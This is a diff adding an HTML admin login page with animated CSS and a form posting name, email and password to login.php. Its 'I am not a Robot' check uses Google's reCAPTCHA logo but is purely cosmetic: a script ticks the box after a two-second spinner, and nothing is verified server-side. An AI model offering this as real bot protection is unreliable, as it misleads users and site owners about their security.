@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Login Page</title>
+    <link rel="icon" type="image/x-icon" href="https://cdn-icons-png.flaticon.com/512/5432/5432747.png">
+    <style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Times New Roman', Times, serif;
+    background: #1c1c1c; 
+    background-size: 400% 400%;
+    animation: gradientBackground 10s ease infinite;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    overflow: hidden;
+    padding: 20px;
+}
+
+
+.login-container {
+    width: 100%;
+    max-width: 400px;
+    padding: 40px;
+    background-color: #2a2a2a; 
+    border: 3px solid #4CAF50; 
+    border-radius: 30px;
+    box-shadow: 0px 10px 20px rgba(0, 0, 0, 0.3);
+    animation: slideIn 0.5s ease-out;
+}
+
+
+@keyframes gradientBackground {
+    0% { background-position: 0% 0%; }
+    50% { background-position: 100% 100%; }
+    100% { background-position: 0% 0%; }
+}
+
+
+h2 {
+    margin-bottom: 20px;
+    font-size: 24px;
+    color: #f0f0f0;
+    text-align: center;
+    transition: color 0.3s ease-in-out;
+}
+
+h2:hover {
+    color: #00bcd4;
+}
+
+
+input[type="text"],
+input[type="email"],
+input[type="password"] {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0;
+    border: none;
+    border-bottom: 2px solid #555; 
+    background-color: #333; 
+    color: #f0f0f0; 
+    font-size: 16px;
+    font-family: 'Times New Roman', Times, serif;
+    transition: border-bottom-color 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
+}
+
+input[type="text"]:focus,
+input[type="email"]:focus,
+input[type="password"]:focus {
+    border-bottom-color: #4CAF50;
+    outline: none;
+    box-shadow: 0 0 5px rgba(0, 0, 0, 0.5);
+}
+
+
+input[type="submit"] {
+    width: 100%;
+    padding: 12px;
+    border: none;
+    color: white;
+    background: linear-gradient(45deg, #4CAF50, #8BC34A, #FFC107);
+    background-size: 300% 300%;
+    font-size: 18px;
+    border-radius: 20px;
+    cursor: pointer;
+    font-family: 'Times New Roman', Times, serif;
+    margin-top: 10px;
+    transition: background-position 0.5s, transform 0.3s;
+    animation: buttonAnimation 5s ease-in-out infinite;
+}
+
+input[type="submit"]:hover {
+    background-position: right center;
+    transform: scale(1.05);
+}
+
+@keyframes buttonAnimation {
+    0% { background-position: 0% 0%; }
+    50% { background-position: 100% 100%; }
+    100% { background-position: 0% 0%; }
+}
+
+
+.captcha-container {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    padding: 8px;
+    background-color: #2a2a2a; 
+    border: 2px solid #555;
+    box-sizing: border-box;
+    width: fit-content;
+    height: fit-content;
+    text-align: center;
+    margin-top: 20px;
+    margin-left: 50px;
+    border-radius: 10px;
+    animation: borderAnimation 3s linear infinite;
+}
+
+
+@keyframes borderAnimation {
+    0% { border-color: #4CAF50; }
+    25% { border-color: #FF9800; }
+    50% { border-color: #2196F3; }
+    75% { border-color: #E91E63; }
+    100% { border-color: #4CAF50; }
+}
+
+
+.captcha-container input[type="checkbox"] {
+    display: none; 
+}
+
+.captcha-container label {
+    font-size: 16px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    padding-left: 35px; 
+    color: #f0f0f0; 
+    transition: color 0.3s ease-in-out;
+}
+
+.captcha-container label:hover {
+    color: #00bcd4;
+}
+
+.custom-checkbox {
+    position: absolute;
+    left: 0;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 25px;
+    height: 25px;
+    background-color: #555;
+    border: 2px solid #777;
+    border-radius: 5px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    
+    transition: background-color 0.3s, border-color 0.3s;
+}
+
+.captcha-container input[type="checkbox"]:checked + .custom-checkbox {
+    background-color: #4CAF50;
+    border-color: #4CAF50;
+}
+
+.custom-checkbox::after {
+    content: '✔';
+    color: white;
+    font-size: 16px;
+    display: none;
+}
+
+.captcha-container input[type="checkbox"]:checked + .custom-checkbox::after {
+    display: block;
+}
+
+.loading-spinner {
+    width: 20px;
+    height: 20px;
+    border: 2px solid #555;
+    border-top: 2px solid #4CAF50;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-right: 10px;
+    display: none;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.error-message {
+    color: #ff4d4d;
+    font-size: 14px;
+    margin-bottom: 15px;
+    display: none;
+    text-align: center;
+}
+
+.recaptcha-icon {
+    margin-left: 10px;
+    width: 20px;
+    height: 20px;
+}
+
+
+@media (max-width: 400px) {
+    input[type="text"],
+    input[type="email"],
+    input[type="password"],
+    input[type="submit"] {
+        font-size: 16px;
+    }
+
+    .login-container {
+        padding: 20px;
+    }
+}
+
+
+@keyframes slideIn {
+    from {
+        transform: translateY(-50%);
+        opacity: 0;
+    }
+    to {
+        transform: translateY(0);
+        opacity: 1;
+    }
+}
+
+    </style>
+</head>
+<body>
+    <img class="cap" src="educ.png">
+
+    <div class="login-container">
+        <h2 style="text-align: left;color: #7ed957;font-family: 'Times New Roman', Times, serif;">Login</h2>
+        <form id="loginForm" action="login.php" method="POST">
+            <input type="text" name="name" placeholder="Name" required>
+            <input type="email" name="email" placeholder="E-Mail" required>
+            <input type="password" name="password" placeholder="Password" required>
+
+            
+            <div class="captcha-container">
+                <div class="loading-spinner" id="loadingSpinner"></div>
+                <label for="captchaCheckbox">
+                    <input type="checkbox" id="captchaCheckbox">
+                    <div class="custom-checkbox"></div>
+                    I am not a Robot
+                    <img class="recaptcha-icon" src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="recaptcha icon">
+                </label>
+            </div>
+            <div class="error-message" id="captchaError">Please verify that you are not a Robot.</div>
+            
+            <input type="submit" value="LOG IN">
+        </form>
+    </div>
+
+    <script>
+        const captchaCheckbox = document.getElementById('captchaCheckbox');
+        const loadingSpinner = document.getElementById('loadingSpinner');
+        const captchaError = document.getElementById('captchaError');
+
+        document.querySelector('.captcha-container label').addEventListener('click', function(event) {
+            if (!captchaCheckbox.checked) {
+                loadingSpinner.style.display = 'inline-block';
+                setTimeout(function() {
+                    loadingSpinner.style.display = 'none';
+                    captchaCheckbox.checked = true;
+                    captchaError.style.display = 'none';
+                }, 2000); 
+            }
+        });
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            if (!captchaCheckbox.checked) {
+                event.preventDefault(); 
+                captchaError.style.display = 'block'; 
+            }
+        });
+    </script>
+</body>
+</html>
